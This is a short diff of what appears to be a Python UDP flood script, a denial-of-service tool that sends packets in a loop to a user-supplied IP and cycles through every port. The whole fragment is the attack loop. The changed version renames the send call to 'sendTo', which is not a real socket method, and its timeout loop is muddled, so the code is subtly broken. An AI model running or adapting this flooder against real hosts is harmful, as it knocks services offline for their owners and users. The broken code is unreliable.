@@ -147,14 +147,14 @@ port = input("\033[1;33;40mPort: ");
 os.system("clear");
 sent = 0;
 while True:
-     while 1:
-        if time.time() > timeout:
-            break;
-        else:
-            pass;
-     sock.sendto(bytes, (ip,port));
+  while 1:
+     if time.time() > timeout:
+       break;
+     else:
+       pass;
+     sock.sendTo(bytes, (ip, port));
      sent = sent + 1;
      port = port + 1;
-     print "1;32;40m%s (%s:%s)" %(sent,ip,port);
+     print "\033[1;32;40m%s (%s:%s)" %(sent, ip, port);
      if port == 65534:
        port = 1;
